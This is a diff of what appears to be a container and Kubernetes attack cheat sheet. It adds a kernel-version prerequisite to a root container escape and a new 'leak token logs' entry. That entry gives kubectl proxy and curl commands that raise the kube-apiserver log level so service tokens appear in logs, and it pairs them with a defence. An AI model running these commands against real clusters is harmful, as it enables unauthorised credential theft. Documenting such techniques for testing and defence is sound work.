@@ -659,7 +659,8 @@ mount /dev/vda1 /mnt
 
 #### use root user to escape
 - Prerequisites
-	- run container with root 
+	- run container with root
+	- kernel version >= 4.6
 - Flow<br>
 ```shell
 # obtain all capabilities
@@ -740,6 +741,15 @@ use docker.sock or remote api to create privileged container
 - Defence<br>
 	- do not mount docker.sock in container
 	- disable docker remote api
+
+#### leak token logs
+- Prerequisites
+	- can view logs `kubectl proxy &;curl http://127.0.0.1:8001/logs/kube-apiserver.log`
+	- can set log level `kubectl proxy &;curl -XPUT --data "10" http://localhost:8001/debug/flags/v`
+- Flow<br>
+set loglevel to 10, and wait for token reveals in log, [ref1](https://hackerone.com/reports/941178) [ref2](https://hackerone.com/reports/952771) [ref3](https://zhuanlan.zhihu.com/p/393049898)
+- Defence<br>
+	- disable profiling `--profiling false`
 
 ## 组件安全
 
